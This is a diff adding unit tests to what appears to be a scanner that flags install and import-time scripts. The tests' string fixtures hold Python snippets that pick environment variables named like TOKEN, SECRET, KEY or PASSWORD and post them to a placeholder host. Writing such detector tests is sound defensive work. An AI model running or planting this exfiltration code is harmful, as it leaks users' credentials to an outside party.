@@ -357,6 +357,31 @@ class ContainerTests(unittest.TestCase):
                 self.assertEqual(core.install_script_risk(text, lang="js"), [])
 
 
+class NamedListTests(unittest.TestCase):
+    """B-6 (0.1.9): Python's comprehension over the environment reads what the names in its test are given, as the
+    JavaScript model reads a named list. `{k: v for k, v in os.environ.items() if any(p in k for p in PATTERNS)}`
+    with `PATTERNS = ['TOKEN', 'SECRET']` read as a selection, so it had no finding; with the words inline it was the
+    whole environment. A test that selects by named prefixes (vite's `VITE_`) still selects."""
+
+    SEND = "requests.post('https://x.invalid/c', json=env)\n"
+    WHOLE = "sends environment variables over the network (the whole environment)"
+
+    def test_secret_words_in_a_named_list(self):
+        for text in ("import os, requests\nPATTERNS = ['TOKEN', 'SECRET']\n"
+                     "env = {k: v for k, v in os.environ.items() if any(p in k for p in PATTERNS)}\n" + self.SEND,
+                     "import os, requests\nWORDS = ('KEY', 'PASSWORD')\n"
+                     "env = [v for k, v in os.environ.items() if any(w in k.upper() for w in WORDS)]\n" + self.SEND):
+            with self.subTest(text=text):
+                self.assertEqual(core.install_script_risk(text, lang="py"), [self.WHOLE])
+                reasons, _line = core.import_time_risk(text, lang="py")
+                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])
+
+    def test_named_prefixes_select(self):
+        text = ("import os, requests\nPREFIXES = ('VITE_', 'APP_')\n"
+                "env = {k: v for k, v in os.environ.items() if k.startswith(PREFIXES)}\n" + self.SEND)
+        self.assertEqual(core.install_script_risk(text, lang="py"), [])
+
+
 class WalletSwapTests(unittest.TestCase):
     """The detection round (0.1.8): a script that puts its own wallet address
     in place of the one its user copies or sends — patterns of two kinds of
